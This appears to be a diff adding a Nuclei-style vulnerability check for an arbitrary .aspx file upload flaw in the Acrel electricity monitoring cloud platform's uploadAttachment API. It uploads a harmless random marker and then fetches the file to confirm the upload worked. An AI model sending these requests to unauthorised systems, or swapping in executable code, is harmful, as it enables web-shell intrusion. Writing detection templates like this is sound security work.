@@ -1,0 +1,57 @@
+id: poc-yaml-acreldny-uploadattachment-anyfile-upload
+info:
+  name: 安科瑞环保用电监管云平台 uploadAttachment 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{base64(rand_text_alphanumeric(7))}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /api/APP/uploadAttachment HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"FileStr":"{{t2}}","FileFormat":"aspx"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "成功"
+          - ".aspx"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "/UpLoad/Temp/([0-9]{18}).aspx"
+        internal: true
+
+  - raw:
+      - |
+        GET /UpLoad/Temp/{{file}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t1}}"
